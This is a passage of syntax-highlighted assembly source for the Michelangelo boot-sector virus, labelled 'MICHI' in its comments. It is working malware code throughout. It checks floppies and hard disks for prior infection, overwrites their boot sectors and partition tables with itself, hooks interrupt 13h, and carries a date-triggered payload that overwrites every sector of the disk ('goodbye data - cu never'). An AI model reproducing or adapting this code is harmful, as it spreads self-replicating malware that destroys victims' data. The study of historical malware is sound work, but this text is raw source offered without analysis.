  </span><span class="sc5">@@</span><span class="sc4">:</span><span class="sc0">           </span><span class="sc6">XOR</span><span class="sc0">     </span><span class="sc8">SI</span><span class="sc4">,</span><span class="sc8">SI</span><span class="sc0">                   </span><span class="sc1">; boot sector has been read,</span><span class="sc0">
                </span><span class="sc6">CLD</span><span class="sc0">                             </span><span class="sc1">; now test if disk already has</span><span class="sc0">
                </span><span class="sc6">LODSW</span><span class="sc0">                           </span><span class="sc1">; been infected. Assume infect-</span><span class="sc0">
                </span><span class="sc6">CMP</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,[</span><span class="sc8">BX</span><span class="sc4">]</span><span class="sc0">                 </span><span class="sc1">; ion if the first 4 bytes of</span><span class="sc0">
                </span><span class="sc6">JNZ</span><span class="sc0">     </span><span class="sc10">@F</span><span class="sc0">                      </span><span class="sc1">; MICHI and the boot sector are</span><span class="sc0">
                </span><span class="sc6">LODSW</span><span class="sc0">                           </span><span class="sc1">; identical ...</span><span class="sc0">
                </span><span class="sc6">CMP</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,[</span><span class="sc8">BX</span><span class="sc4">+</span><span class="sc2">02</span><span class="sc4">]</span><span class="sc0">              </span><span class="sc1">;</span><span class="sc0">
                </span><span class="sc6">JZ</span><span class="sc0">      </span><span class="sc5">TstInfF_EX</span><span class="sc0">              </span><span class="sc1">; exit, disk already infected</span><span class="sc0">
  </span><span class="sc5">@@</span><span class="sc4">:</span><span class="sc0">           </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc5">wWRITE</span><span class="sc0"> </span><span class="sc5">v</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">           </span><span class="sc1">; AX : Write one sector</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">DH</span><span class="sc4">,</span><span class="sc2">01</span><span class="sc0">                   </span><span class="sc1">; DH : Head 1</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">CL</span><span class="sc4">,</span><span class="sc2">03</span><span class="sc0">                   </span><span class="sc1">; CL : Sector 3</span><span class="sc0">
                </span><span class="sc6">CMP</span><span class="sc0">     </span><span class="sc5">B</span><span class="sc0"> </span><span class="sc5">P</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">BX</span><span class="sc4">+</span><span class="sc2">15</span><span class="sc4">],</span><span class="sc2">0FDH</span><span class="sc0">        </span><span class="sc1">; adjust CL to E if the MEDIA ID</span><span class="sc0">
                </span><span class="sc6">JZ</span><span class="sc0">      </span><span class="sc10">@F</span><span class="sc0">                      </span><span class="sc1">;  field of the original boot</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">CL</span><span class="sc4">,</span><span class="sc2">0E</span><span class="sc0">                   </span><span class="sc1">;  sector is not FD (5.25",360K)</span><span class="sc0">
  </span><span class="sc5">@@</span><span class="sc4">:</span><span class="sc0">           </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">CYLSEG</span><span class="sc4">],</span><span class="sc8">CX</span><span class="sc0">             </span><span class="sc1">; store CX</span><span class="sc0">
                </span><span class="sc5">SAVE</span><span class="sc0">    </span><span class="sc5">F</span><span class="sc0">                       </span><span class="sc1">; and write the original boot</span><span class="sc0">
                </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">D</span><span class="sc0"> </span><span class="sc5">P</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">BIOS13OFS</span><span class="sc4">]</span><span class="sc0">         </span><span class="sc1">;   sector to the floppy disk</span><span class="sc0">
                </span><span class="sc6">JB</span><span class="sc0">      </span><span class="sc5">TstInfF_EX</span><span class="sc0">              </span><span class="sc1">; if an error occured,</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">SI</span><span class="sc4">,</span><span class="sc5">O</span><span class="sc0"> </span><span class="sc5">PARTTBL</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">SECSIZE</span><span class="sc0">  </span><span class="sc1">;         exit in haste.</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">DI</span><span class="sc4">,</span><span class="sc5">O</span><span class="sc0"> </span><span class="sc5">PARTTBL</span><span class="sc0">            </span><span class="sc1">; Copy the last bytes of</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc2">0021</span><span class="sc0">                 </span><span class="sc1">;   the original boot sector to</span><span class="sc0">
                </span><span class="sc6">CLD</span><span class="sc0">                             </span><span class="sc1">;   the end of MICHI</span><span class="sc0">
                </span><span class="sc6">REP</span><span class="sc0">     </span><span class="sc6">MOVSW</span><span class="sc0">                   </span><span class="sc1">;</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc5">wWRITE</span><span class="sc0"> </span><span class="sc5">v</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">           </span><span class="sc1">; ... and write it to the boot</span><span class="sc0">
                </span><span class="sc6">XOR</span><span class="sc0">     </span><span class="sc8">BX</span><span class="sc4">,</span><span class="sc8">BX</span><span class="sc0">                   </span><span class="sc1">;   sector of the disk.</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc2">0001</span><span class="sc0">                 </span><span class="sc1">;</span><span class="sc0">
                </span><span class="sc6">XOR</span><span class="sc0">     </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc8">DX</span><span class="sc0">                   </span><span class="sc1">;</span><span class="sc0">
                </span><span class="sc5">SAVE</span><span class="sc0">    </span><span class="sc5">F</span><span class="sc0">                       </span><span class="sc1">;</span><span class="sc0">
                </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">D</span><span class="sc0"> </span><span class="sc5">P</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">BIOS13OFS</span><span class="sc4">]</span><span class="sc0">         </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">TstInfF_EX</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc9">REST</span><span class="sc0">    </span><span class="sc8">DI</span><span class="sc4">,</span><span class="sc8">SI</span><span class="sc4">,</span><span class="sc8">ES</span><span class="sc4">,</span><span class="sc8">DS</span><span class="sc4">,</span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc8">BX</span><span class="sc4">,</span><span class="sc8">AX</span><span class="sc0"> </span><span class="sc1">; restore regs</span><span class="sc0">
                </span><span class="sc6">RET</span><span class="sc0">                             </span><span class="sc1">; ... return</span><span class="sc0">
                                                </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; -----------------------------------------------------------------------------</span><span class="sc0">
                                                </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">INIT</span><span class="sc4">:</span><span class="sc0">           </span><span class="sc6">XOR</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc8">AX</span><span class="sc0">                   </span><span class="sc1">; Set DS and SS to 0000,</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">DS</span><span class="sc4">,</span><span class="sc8">AX</span><span class="sc0">                   </span><span class="sc1">;  initialize SP to 7C00.</span><span class="sc0">
                </span><span class="sc6">CLI</span><span class="sc0">                             </span><span class="sc1">;  That's because the boot</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">SS</span><span class="sc4">,</span><span class="sc8">AX</span><span class="sc0">                   </span><span class="sc1">;  sector will loaded into</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc5">OFSFRM0</span><span class="sc0">              </span><span class="sc1">;  memory at 0:7C00 on every</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">SP</span><span class="sc4">,</span><span class="sc8">AX</span><span class="sc0">                   </span><span class="sc1">;  IBM clone ...</span><span class="sc0">
                </span><span class="sc6">STI</span><span class="sc0">                             </span><span class="sc1">;</span><span class="sc0">
                                                </span><span class="sc1">;</span><span class="sc0">
                </span><span class="sc5">SAVE</span><span class="sc0">    </span><span class="sc8">DS</span><span class="sc4">,</span><span class="sc8">AX</span><span class="sc0">                   </span><span class="sc1">; save (0000:7C00) on stack</span><span class="sc0">
                                                </span><span class="sc1">;</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,[</span><span class="sc5">OR13OFF</span><span class="sc4">]</span><span class="sc0">            </span><span class="sc1">; Read old interrupt 13h vector</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">SHDW13OFS</span><span class="sc4">],</span><span class="sc8">AX</span><span class="sc0">          </span><span class="sc1">;        and save it</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,[</span><span class="sc5">OR13SEG</span><span class="sc4">]</span><span class="sc0">            </span><span class="sc1">;</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">SHDW13SEG</span><span class="sc4">],</span><span class="sc8">AX</span><span class="sc0">          </span><span class="sc1">;</span><span class="sc0">
                                                </span><span class="sc1">;</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,[</span><span class="sc5">SYSRAM</span><span class="sc4">]</span><span class="sc0">             </span><span class="sc1">; Substract 2 from base memory</span><span class="sc0">
                </span><span class="sc6">DEC</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc0">                      </span><span class="sc1">;   size variable in BIOS data</span><span class="sc0">
                </span><span class="sc6">DEC</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc0">                      </span><span class="sc1">;   area</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">SYSRAM</span><span class="sc4">],</span><span class="sc8">AX</span><span class="sc0">             </span><span class="sc1">;</span><span class="sc0">
                                                </span><span class="sc1">;</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">CL</span><span class="sc4">,</span><span class="sc2">06</span><span class="sc0">                   </span><span class="sc1">; ES = AX = segment part of huge</span><span class="sc0">
                </span><span class="sc6">SHL</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc8">CL</span><span class="sc0">                   </span><span class="sc1">;   ptr to area 2KB below last</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">ES</span><span class="sc4">,</span><span class="sc8">AX</span><span class="sc0">                   </span><span class="sc1">;   base memory location</span><span class="sc0">
                                                </span><span class="sc1">;</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">SHDWRELOCSEG</span><span class="sc4">],</span><span class="sc8">AX</span><span class="sc0">       </span><span class="sc1">; Store seg for ind far jmp</span><span class="sc0">
                                                </span><span class="sc1">;   to relocated code</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc5">O</span><span class="sc0"> </span><span class="sc5">I13_ISR</span><span class="sc0">            </span><span class="sc1">; Store ptr to new interrupt</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">OR13OFF</span><span class="sc4">],</span><span class="sc8">AX</span><span class="sc0">            </span><span class="sc1">;   13 service routine to</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">OR13SEG</span><span class="sc4">],</span><span class="sc8">ES</span><span class="sc0">            </span><span class="sc1">;   interrupt table,</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc5">O</span><span class="sc0"> </span><span class="sc5">PARTTBL</span><span class="sc0">            </span><span class="sc1">; Relocate code,</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">SI</span><span class="sc4">,</span><span class="sc5">OFSFRM0</span><span class="sc0">              </span><span class="sc1">;</span><span class="sc0">
                </span><span class="sc6">XOR</span><span class="sc0">     </span><span class="sc8">DI</span><span class="sc4">,</span><span class="sc8">DI</span><span class="sc0">                   </span><span class="sc1">;</span><span class="sc0">
                </span><span class="sc6">CLD</span><span class="sc0">                             </span><span class="sc1">;</span><span class="sc0">
                </span><span class="sc6">REP</span><span class="sc0">     </span><span class="sc6">MOVSB</span><span class="sc0">                   </span><span class="sc1">;</span><span class="sc0">
                </span><span class="sc6">JMP</span><span class="sc0">     </span><span class="sc5">D</span><span class="sc0"> </span><span class="sc5">P</span><span class="sc0"> </span><span class="sc8">CS</span><span class="sc4">:[</span><span class="sc5">SHDWRELOCOFS</span><span class="sc4">]</span><span class="sc0">   </span><span class="sc1">; Jmp to FRSTRLCTD (relo-</span><span class="sc0">
                                                </span><span class="sc1">;   cated code)(BUGGY)</span><span class="sc0">
                                                </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">FRSTRLCTD</span><span class="sc4">:</span><span class="sc0">      </span><span class="sc6">XOR</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc8">AX</span><span class="sc0">                   </span><span class="sc1">; Reset the disk system</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">ES</span><span class="sc4">,</span><span class="sc8">AX</span><span class="sc0">                   </span><span class="sc1">;</span><span class="sc0">
                </span><span class="sc6">INT</span><span class="sc0">     </span><span class="sc2">13</span><span class="sc0">                      </span><span class="sc1">;</span><span class="sc0">
                </span><span class="sc5">MOV_S</span><span class="sc0">   </span><span class="sc8">DS</span><span class="sc4">,</span><span class="sc8">CS</span><span class="sc0">                   </span><span class="sc1">; ES = 0; DS = CS;</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc5">wREAD</span><span class="sc0"> </span><span class="sc5">v</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">            </span><span class="sc1">; AH = 'Read', AL = # to read</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">BX</span><span class="sc4">,</span><span class="sc5">OFSFRM0</span><span class="sc0">              </span><span class="sc1">; ES:BX = 0:7C00 = xfer address</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">CX</span><span class="sc4">,[</span><span class="sc5">CYLSEG</span><span class="sc4">]</span><span class="sc0">             </span><span class="sc1">; CH = cylinder #, CL = sector #</span><span class="sc0">
                                                </span><span class="sc1">;</span><span class="sc0">
                </span><span class="sc6">CMP</span><span class="sc0">     </span><span class="sc8">CX</span><span class="sc4">,+</span><span class="sc2">07</span><span class="sc0">                  </span><span class="sc1">; Booted from winchester drive?</span><span class="sc0">
                </span><span class="sc6">JNZ</span><span class="sc0">     </span><span class="sc10">@F</span><span class="sc0">                      </span><span class="sc1">;       jmp if not</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc2">0000</span><span class="sc0"> </span><span class="sc5">v</span><span class="sc0"> </span><span class="sc5">WINCHESTER1</span><span class="sc0">   </span><span class="sc1">; DH = head 0, DL = drive C</span><span class="sc0">
                </span><span class="sc6">INT</span><span class="sc0">     </span><span class="sc2">13</span><span class="sc0">                      </span><span class="sc1">; read the original boot sector</span><span class="sc0">
                </span><span class="sc6">JMP</span><span class="sc0">     </span><span class="sc5">S</span><span class="sc0"> </span><span class="sc5">BOOTNOW</span><span class="sc0">               </span><span class="sc1">;   and jmp</span><span class="sc0">
                                                </span><span class="sc1">;</span><span class="sc0">
  </span><span class="sc5">@@</span><span class="sc4">:</span><span class="sc0">           </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">CX</span><span class="sc4">,[</span><span class="sc5">CYLSEG</span><span class="sc4">]</span><span class="sc0">             </span><span class="sc1">; adjust cylinder/sector #s</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc2">0100</span><span class="sc0">                 </span><span class="sc1">; DH = head 1, DL = drive A</span><span class="sc0">
                </span><span class="sc6">INT</span><span class="sc0">     </span><span class="sc2">13</span><span class="sc0">                      </span><span class="sc1">; and read the sector ...</span><span class="sc0">
                </span><span class="sc6">JB</span><span class="sc0">      </span><span class="sc5">BOOTNOW</span><span class="sc0">                 </span><span class="sc1">; (jmp on error, else continue)</span><span class="sc0">
                </span><span class="sc5">MOV_S</span><span class="sc0">   </span><span class="sc8">ES</span><span class="sc4">,</span><span class="sc8">CS</span><span class="sc0">                   </span><span class="sc1">; ES = CS;</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc5">wREAD</span><span class="sc0"> </span><span class="sc5">v</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">            </span><span class="sc1">; read partition table of 1st</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">BX</span><span class="sc4">,</span><span class="sc5">O</span><span class="sc0"> </span><span class="sc5">DTA</span><span class="sc0">                </span><span class="sc1">; hard disk into buffer located</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc2">0001</span><span class="sc0">                 </span><span class="sc1">; just after the relocated code</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc2">0000</span><span class="sc0"> </span><span class="sc5">v</span><span class="sc0"> </span><span class="sc5">WINCHESTER1</span><span class="sc0">   </span><span class="sc1">;</span><span class="sc0">
                </span><span class="sc6">INT</span><span class="sc0">     </span><span class="sc2">13</span><span class="sc0">                      </span><span class="sc1">;</span><span class="sc0">
                </span><span class="sc6">JB</span><span class="sc0">      </span><span class="sc5">BOOTNOW</span><span class="sc0">                 </span><span class="sc1">; (jmp on error, else continue)</span><span class="sc0">
                </span><span class="sc6">XOR</span><span class="sc0">     </span><span class="sc8">SI</span><span class="sc4">,</span><span class="sc8">SI</span><span class="sc0">                   </span><span class="sc1">;</span><span class="sc0">
                </span><span class="sc6">CLD</span><span class="sc0">                             </span><span class="sc1">; test if hard disk is already</span><span class="sc0">
                </span><span class="sc6">LODSW</span><span class="sc0">                           </span><span class="sc1">; infected by comparing the 1st</span><span class="sc0">
                </span><span class="sc6">CMP</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,[</span><span class="sc8">BX</span><span class="sc4">]</span><span class="sc0">                 </span><span class="sc1">; four bytes, if these are</span><span class="sc0">
                </span><span class="sc6">JNZ</span><span class="sc0">     </span><span class="sc5">INFECT_PARTTBL</span><span class="sc0">          </span><span class="sc1">; identical assume that the</span><span class="sc0">
                </span><span class="sc6">LODSW</span><span class="sc0">                           </span><span class="sc1">; hard disk already is infected</span><span class="sc0">
                </span><span class="sc6">CMP</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,[</span><span class="sc8">BX</span><span class="sc4">+</span><span class="sc2">02</span><span class="sc4">]</span><span class="sc0">              </span><span class="sc1">; and continue, else jmp to</span><span class="sc0">
                </span><span class="sc6">JNZ</span><span class="sc0">     </span><span class="sc5">INFECT_PARTTBL</span><span class="sc0">          </span><span class="sc1">; infect procedure</span><span class="sc0">
                                                </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">BOOTNOW</span><span class="sc4">:</span><span class="sc0">        </span><span class="sc6">XOR</span><span class="sc0">     </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc8">CX</span><span class="sc0">                   </span><span class="sc1">; read date from real time clock</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc2">04</span><span class="sc0">                   </span><span class="sc1">; (will _not_ work on old BIOSes</span><span class="sc0">
                </span><span class="sc6">INT</span><span class="sc0">     </span><span class="sc2">1A</span><span class="sc0">                      </span><span class="sc1">;  that do not implement it)</span><span class="sc0">
                </span><span class="sc6">CMP</span><span class="sc0">     </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc5">MICHELANGELO</span><span class="sc0">         </span><span class="sc1">; jmp if today is the</span><span class="sc0">
                </span><span class="sc6">JZ</span><span class="sc0">      </span><span class="sc5">BIRTHDAY</span><span class="sc0">                </span><span class="sc1">;   birthday of MICHELANGELO</span><span class="sc0">
                </span><span class="sc6">RETF</span><span class="sc0">                            </span><span class="sc1">; 'return' to original boot sec-</span><span class="sc0">
                                                </span><span class="sc1">;   tor code</span><span class="sc0">
                                                </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; -----------------------------------------------------------------------------</span><span class="sc0">
                                                </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">BIRTHDAY</span><span class="sc4">:</span><span class="sc0">       </span><span class="sc6">XOR</span><span class="sc0">     </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc8">DX</span><span class="sc0">                   </span><span class="sc1">; DH = head 0; DL = drive A</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc2">0001</span><span class="sc0">                 </span><span class="sc1">; CH = cylinder 0; CL = sector 1</span><span class="sc0">
</span><span class="sc5">BIRTHDAY_LOOP</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc5">wWRITE</span><span class="sc0"> </span><span class="sc5">v</span><span class="sc0"> </span><span class="sc2">9</span><span class="sc0">           </span><span class="sc1">; AH = 'Write'; AL = # of sectrs</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">SI</span><span class="sc4">,[</span><span class="sc5">CYLSEG</span><span class="sc4">]</span><span class="sc0">             </span><span class="sc1">; adjust AL ( # of sectors) and</span><span class="sc0">
                </span><span class="sc6">CMP</span><span class="sc0">     </span><span class="sc8">SI</span><span class="sc4">,+</span><span class="sc2">03</span><span class="sc0">                  </span><span class="sc1">; DL (drive code) depending on</span><span class="sc0">
                </span><span class="sc6">JZ</span><span class="sc0">      </span><span class="sc10">@F</span><span class="sc0">                      </span><span class="sc1">; the type of the current boot</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc2">0E</span><span class="sc0">                   </span><span class="sc1">; disk</span><span class="sc0">
                </span><span class="sc6">CMP</span><span class="sc0">     </span><span class="sc8">SI</span><span class="sc4">,+</span><span class="sc2">0E</span><span class="sc0">                  </span><span class="sc1">;</span><span class="sc0">
                </span><span class="sc6">JZ</span><span class="sc0">      </span><span class="sc10">@F</span><span class="sc0">                      </span><span class="sc1">;</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">DL</span><span class="sc4">,</span><span class="sc5">WINCHESTER1</span><span class="sc0">          </span><span class="sc1">;</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc5">B</span><span class="sc0"> </span><span class="sc5">P</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">HEADS</span><span class="sc4">],</span><span class="sc2">04</span><span class="sc0">          </span><span class="sc1">;</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc2">11</span><span class="sc0">                   </span><span class="sc1">;</span><span class="sc0">
  </span><span class="sc5">@@</span><span class="sc4">:</span><span class="sc0">           </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">BX</span><span class="sc4">,</span><span class="sc2">5000</span><span class="sc0">                 </span><span class="sc1">; ES:BX -&gt; 'Buffer' = 5000:5000</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">ES</span><span class="sc4">,</span><span class="sc8">BX</span><span class="sc0">                   </span><span class="sc1">;</span><span class="sc0">
                </span><span class="sc6">INT</span><span class="sc0">     </span><span class="sc2">13</span><span class="sc0">                      </span><span class="sc1">;</span><span class="sc0">
                </span><span class="sc6">JNB</span><span class="sc0">     </span><span class="sc10">@F</span><span class="sc0">                      </span><span class="sc1">;</span><span class="sc0">
                </span><span class="sc6">XOR</span><span class="sc0">     </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc8">AH</span><span class="sc0">                   </span><span class="sc1">; reset disk system if an error</span><span class="sc0">
                </span><span class="sc6">INT</span><span class="sc0">     </span><span class="sc2">13</span><span class="sc0">                      </span><span class="sc1">;   occured</span><span class="sc0">
  </span><span class="sc5">@@</span><span class="sc4">:</span><span class="sc0">           </span><span class="sc6">INC</span><span class="sc0">     </span><span class="sc8">DH</span><span class="sc0">                      </span><span class="sc1">; increment head (DH)</span><span class="sc0">
                </span><span class="sc6">CMP</span><span class="sc0">     </span><span class="sc8">DH</span><span class="sc4">,[</span><span class="sc5">HEADS</span><span class="sc4">]</span><span class="sc0">              </span><span class="sc1">; head &lt; maxhead? continue if</span><span class="sc0">
                </span><span class="sc6">JB</span><span class="sc0">      </span><span class="sc5">BIRTHDAY_LOOP</span><span class="sc0">           </span><span class="sc1">;   equal, else loop</span><span class="sc0">
                </span><span class="sc6">XOR</span><span class="sc0">     </span><span class="sc8">DH</span><span class="sc4">,</span><span class="sc8">DH</span><span class="sc0">                   </span><span class="sc1">;</span><span class="sc0">
                </span><span class="sc6">INC</span><span class="sc0">     </span><span class="sc8">CH</span><span class="sc0">                      </span><span class="sc1">; increment cylinder and loop</span><span class="sc0">
                </span><span class="sc6">JMP</span><span class="sc0">     </span><span class="sc5">BIRTHDAY_LOOP</span><span class="sc0">           </span><span class="sc1">; ( goodbye data - cu never )</span><span class="sc0">
                                                </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; -----------------------------------------------------------------------------</span><span class="sc0">
                                                </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">INFECT_PARTTBL</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc2">0007</span><span class="sc0">                 </span><span class="sc1">; It's an HD, take sector 7 to</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">CYLSEG</span><span class="sc4">],</span><span class="sc8">CX</span><span class="sc0">             </span><span class="sc1">;   save the original partition</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc5">wWRITE</span><span class="sc0"> </span><span class="sc5">v</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">           </span><span class="sc1">;   table and write it to disk</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc2">0000</span><span class="sc0"> </span><span class="sc5">v</span><span class="sc0"> </span><span class="sc5">WINCHESTER1</span><span class="sc0">   </span><span class="sc1">;</span><span class="sc0">
                </span><span class="sc6">INT</span><span class="sc0">     </span><span class="sc2">13</span><span class="sc0">                      </span><span class="sc1">;</span><span class="sc0">
                </span><span class="sc6">JB</span><span class="sc0">      </span><span class="sc5">BOOTNOW</span><span class="sc0">                 </span><span class="sc1">; jmp on error</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">SI</span><span class="sc4">,</span><span class="sc5">O</span><span class="sc0"> </span><span class="sc5">PARTTBL</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">SECSIZE</span><span class="sc0">  </span><span class="sc1">; copy partition informa-</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">DI</span><span class="sc4">,</span><span class="sc5">O</span><span class="sc0"> </span><span class="sc5">PARTTBL</span><span class="sc0">            </span><span class="sc1">;   tion to the end of MICHI</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc2">0021</span><span class="sc0">                 </span><span class="sc1">;</span><span class="sc0">
                </span><span class="sc6">REP</span><span class="sc0">     </span><span class="sc6">MOVSW</span><span class="sc0">                   </span><span class="sc1">;</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc5">wWRITE</span><span class="sc0"> </span><span class="sc5">v</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">           </span><span class="sc1">; and write MICHI to the first</span><span class="sc0">
                </span><span class="sc6">XOR</span><span class="sc0">     </span><span class="sc8">BX</span><span class="sc4">,</span><span class="sc8">BX</span><span class="sc0">                   </span><span class="sc1">;   sector of the hard disk ...</span><span class="sc0">
                </span><span class="sc6">INC</span><span class="sc0">     </span><span class="sc8">CL</span><span class="sc0">                      </span><span class="sc1">;</span><span class="sc0">
                </span><span class="sc6">INT</span><span class="sc0">     </span><span class="sc2">13</span><span class="sc0">                      </span><span class="sc1">;</span><span class="sc0">
                </span><span class="sc6">JMP</span><span class="sc0">     </span><span class="sc5">BOOTNOW</span><span class="sc0">                 </span><span class="sc1">;</span><span class="sc0">
                                                </span><span class="sc1">;</span><span class="sc0">
